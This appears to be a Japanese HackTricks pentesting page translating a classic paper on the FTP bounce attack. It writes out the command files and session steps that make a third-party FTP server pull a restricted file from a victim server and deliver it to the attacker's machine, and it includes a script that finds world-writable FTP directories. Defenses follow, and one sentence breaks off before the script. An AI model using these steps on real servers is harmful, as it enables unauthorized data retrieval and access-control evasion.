<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>


# レジュメ

バウンスFTPサーバーにアクセスできる場合、他のFTPサーバー（一部の資格情報を知っている）にファイルを要求し、そのファイルを自分のサーバーにダウンロードすることができます。

## 必要条件

FTPミドルサーバーの有効な資格情報
被害者FTPサーバーの有効な資格情報
両方のサーバーがPORTコマンドを受け入れる（バウンスFTP攻撃）
FRPミドルサーバーのディレクトリに書き込むことができる
ミドルサーバーは何らかの理由で被害者FTPサーバー内であなたよりも多くのアクセス権を持っています（これを悪用します）

## 手順

1. 自分のFTPサーバーに接続し、接続をパッシブモード（pasvコマンド）にして、被害者サービスがファイルを送信するディレクトリでリッスンするようにします。
2. FTPミドルサーバーに送信するファイルを作成します（攻撃）。このファイルは、被害者サーバーに対して認証を行い、ディレクトリを変更し、ファイルを自分のサーバーにダウンロードするための必要なコマンドのプレーンテキストです。
3. FTPミドルサーバーに接続し、前のファイルをアップロードします。
4. FTPミドルサーバーが被害者サーバーと接続し、攻撃ファイルを送信するようにします。
5. 自分のFTPサーバーでファイルをキャプチャします。
6. FTPミドルサーバーから攻撃ファイルを削除します。



この投稿のすべての情報は、[http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)から抽出されました。

# FTPバウンス攻撃

これは「FTPサーバーバウンス攻撃」の可能な使用法の1つについて説明しています。使用されるメカニズムはおそらくよく知られていますが、詳細を説明したり修正したりすることへの関心は低いか存在しないようです。この具体的な例は、ほとんどの電子的に強制される「輸出規制」が完全に無意味で回避するのが非常に簡単であることを読者に気づかせるために選ばれています。これは、標準のFTPプロトコルのいくつかの本当に考えられていない側面があることに注意を引くためです。

また、数か月前にimag.frのAlain Knaff氏との短いが楽しい議論にも感謝します。これにより、これらの問題についてより深く考えるようになりました。

## 動機

あなたはforeign.frのユーザーであり、IPアドレスはF.F.F.Fです。米国のcrypto.comから暗号ソースコードを取得したいとします。crypto.comのFTPサーバーは、接続を許可しますが、あなたのソースIPアドレスが非米国のサイトであるため、暗号ソースへのアクセスを拒否します\[DNSからそのように判断できる限り\]。いずれにせよ、crypto.comのサーバーから直接必要なものを取得することはできません。

ただし、ufred.eduは米国にあるため、crypto.comはufred.eduに対して暗号ソースのダウンロードを許可します。あなたは、ufred.eduの/incomingがワールドライト可能なディレクトリであり、匿名ユーザーがファイルをドロップして読み取ることができることを知っています。Crypto.comのIPアドレスはC.C.C.Cです。

## 攻撃

これにはパッシブモードを使用するFTPサーバーが必要です。自分のマシンの実際のIPアドレス\[localhostではない\]にFTP接続を開き、ログインします。書き込みアクセス権がある便利なディレクトリに変更し、次の操作を行います：
```text
pasv
stor foobar
```
アドレスとポートをPASVコマンドから取得し、F,F,F,F,X,Xとなります。このFTPセッションは現在停止しているため、バックグラウンドに移動するか、他のウィンドウに切り替えて作業を続けてください。

FTPサーバーのコマンドを含むファイルを作成します。このファイルを「instrs」と呼びましょう。以下のようになります：
```text
user ftp
pass -anonymous@
cwd /export-restricted-crypto
type i
port F,F,F,F,X,X
retr crypto.tar.Z
quit
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
...
```
F,F,F,F,X,Xは、最初の接続で自分のマシンが提供したアドレスとポートです。末尾のゴミは、各行に250個のNULLとそれ以外の何もない追加行で、約60Kの余分なデータを埋めるためのものです。この埋め物の理由は後で説明されます。

ufred.eduに匿名でFTP接続を開き、/incomingに移動します。次に、以下のコマンドをこのFTPセッションに入力します。これにより、"`instrs`"ファイルのコピーが転送され、ufred.eduのFTPサーバーがcrypto.comのFTPサーバーに接続し、あなたのファイルをコマンドとして使用します。
```text
put instrs
port C,C,C,C,0,21
retr instrs
```
`Crypto.tar.Z`は、最初のFTP接続を介してあなたのマシン上で「foobar」として表示されるはずです。ufred.eduへの接続が一般的なサーバーバグによって自動的に切断されなかった場合は、「instrs」を削除して終了します。そうでない場合は、接続を再接続して終了する必要があります。

## 議論

これにはいくつかのバリエーションがあります。PASVリスナー接続は、ファイルの書き込みアクセス権を持つ任意のマシンで開くことができます。自分自身、ufred.eduへの別の接続、または完全に関係のない場所です。実際、FTPデータ接続は、これを行うための便利な方法に過ぎません。

コマンドファイルの末尾の余分なヌルは、ufred -&gt; crypto接続の両端のTCPウィンドウを埋めるためのものであり、コマンド接続がセッション全体が実行されるまで開いたままになることを保証します。それ以外の場合、ほとんどのFTPサーバーは、制御接続が予期せずに閉じられたときにすべての転送とコマンド処理を中止する傾向があります。データのサイズは、受信ウィンドウと送信ウィンドウの両方を埋めるのに十分であり、一部のOSではかなり大きいです\[約30Kのオーダー\]。両端のデフォルトのTCPウィンドウサイズの合計と、両端にどのOSがあるかを知っている場合は、これを削減することができます。おそらく、すでにサーバーに終了するように指示したため、ターゲットサーバーのコマンドバッファをオーバーランすることを避けるために、250文字の行に分割されています。

crypto.comがforeign.frからのFTPクライアント接続を許可しない場合、どのファイルがどこにあるかを確認する必要がある場合は、コマンドファイルに「list -aR」と入力して、ufredを介してツリー全体のディレクトリリストを取得することができます。

ASCIIモードではなくバイナリモードでコマンドファイルをターゲットのFTPサーバーに取得する必要がある場合があります。一部のFTPサーバーは生の改行に対応できますが、他のサーバーではCRLFペアで終了する必要がある場合があります。FTPサーバー以外のデーモンにファイルを取得する場合には、これを念頭に置いてください。

## その他の可能性

このようなサードパーティの接続は、片方向のみですが、さまざまなことに使用することができます。ほかのサイトでメールやニュースをほとんど追跡できない形で投稿したり、さまざまなサイトのサーバーに負荷をかけたり、ディスクを埋めたり、ファイアウォールを越えようとしたり、一般的に追跡が難しく迷惑な行動をすることができます。少し考えると、他の多くの恐ろしい可能性に気づくでしょう。

この方法で起動される接続は、ソースポート20から送信されます。一部のサイトは、"ftp-data"の問題に対処するためにファイアウォールを通過させることを許可しています。一部の目的において、これはソースルーティング攻撃に次ぐものであり、パケットフィルタに対してソースルーティングが失敗する場合に成功する可能性があります。そして、FTPプロトコルの仕様がどのように書かれているかによって、制御接続がどこからでも来ること、データ接続がどこにでも行くことが可能になっています。

## 防御策

ネット上には常に古いFTPサーバーと書き込み可能なディレクトリがあるサイトが存在するため、「すべてのFTPサーバーを修正する」と言うのは間違った答えです。ただし、サードパーティのバウンスポイントになることや、他のバウンスポイントがあなたに対して使用されることを防ぐことはできます。

最初に明らかなことは、FTPサーバーがデータ接続を制御接続の発信元と同じホストにのみ作成できるようにすることです。もちろん、これは上記の攻撃を防ぐことはできません。なぜなら、PASVリスナーは簡単にufred.edu上にある可能性があり、その要件を満たすからですが、少なくとも\*あなたの\*サイトが潜在的なバウンスポイントになるのを防ぎます。これは「プロキシFTP」の概念を壊しますが、この段落のどこかに非常に小さなバイオリンが隠れています。

次に明らかなことは、予約されたポート、または少なくともポート20からのFTP制御接続を禁止することです。これにより、上記のシナリオが防止されます。

これらのことに加えて、ソースルーティングパケットやその他のスプーフィングの手段をブロックするといった通常の対策が、このようなハックを防ぐために必要です。また、開いている「受信」ディレクトリが本当に必要かどうかを考えてみてください。

パッシブモードのクライアントデータ接続のみを許可することも可能ですが、パッシブ対応でないFTPクライアントがまだ多数使用されているため、完全な解決策ではありません。

## "緩やかな合意と実行可能なコード"

ここで、この問題に取り組む既存の作業がいくつか利用可能です。avian.orgの"[fixkitsアーカイブ](ftp://ftp.avian.org:/src/fixkits/)"には、wu-ftpd-2.4へのいくつかの修正が含まれています。これには、不正なPORTコマンドの使用を防止し、ログに記録するためのコードが含まれています。他の場所からの最新のセキュリティ修正も含まれており、s/keyサポートや特定のアプリケーションのセキュリティ強化のためのさまざまなコンパイル時オプションも提供されています。

academ.comのStan Barberは、これらと他のいくつかの修正を真の更新されたwu-ftpdリリースに統合する作業を行っています。他にもいくつかの異なる取り組みが進行中です。まだこの作業が完了しているとは主張されていませんが、私が長い間考えていたことの始まりです。ネットワーク全体でのwu-ftpd-2.5のリリースであり、ネットワークからの貢献を含んでいます。wu-ftpdサーバーは非常に人気がありますが、さらなるセキュリティのアップグレードが必要です。すべての改善策を一箇所にまとめることができれば素晴らしいですし、それが実現しそうです。もちろん、ベンダーから提供されたサーバーを実行し続ける人々にはまだ助けになりません。

クライアント接続のソースポートの正当性チェックは、FTPサーバーの修正では特に実装されていませんが、Wietseのtcp-wrappersパッケージの修正に実装されています。これはより一般的な問題なので、呼
```text
#!/bin/sh
ftp -n $1 << FOE
quote "user ftp"
quote "pass -nobody@"
prompt
cd /
dir "-aR" xxx.$$
bye
FOE
# Not smart enough to figure out ftp's numeric UID if no passwd file!
cat -v xxx.$$ | awk '
BEGIN { idir = "/" ; dirp = 0 }
/.:$/ { idir = $0 ; dirp = 1 ; }
/^[-d][-r](......w.|........  *[0-9]* ftp  *)/ {
if (dirp == 1) print idir
dirp = 0
print $0
} '
rm xxx.$$
```
私たちはこれをホワイトペーパーと呼ぶことができるでしょう。それはavian.orgの[/random/ftp-attack](ftp://ftp.avian.org:/random/ftp-attack)で入手可能であり、さまざまな関連する場所に投稿されています。 \_H\* 950712



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
